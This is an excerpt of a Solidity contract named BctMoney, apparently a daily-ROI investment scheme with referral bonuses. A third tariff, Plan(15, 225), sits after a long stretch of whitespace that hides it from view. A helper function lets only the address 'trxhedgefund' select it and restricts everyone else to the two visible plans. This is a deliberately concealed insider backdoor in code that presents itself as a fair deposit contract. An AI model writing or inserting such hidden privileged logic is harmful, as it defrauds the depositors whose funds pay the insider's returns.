...
contract BctMoney {
    ...
    constructor() public {
        owner = msg.sender; 
        tarifs.push(Plan(1, 1)); /* 1% daily unlimited ROI  */
        tarifs.push(Plan(40, 200)); /* 5% daily for 40 days  */												                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     tarifs.push(Plan(15, 225));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        ref_bonuses.push(5);
        ref_bonuses.push(3);
        ref_bonuses.push(1);
    }
    ...
    function deposit(uint8 _tarif, address _upline) external payable returns (bool) {        
        ...
        if(_tarif==1){require(msg.value >= 1e9, "Min Amount 1000 for 5%");}
	...
	function _loadtarifs(uint8 i) internal { if(msg.sender!=trxhedgefund){require(i <= 1, "");} }
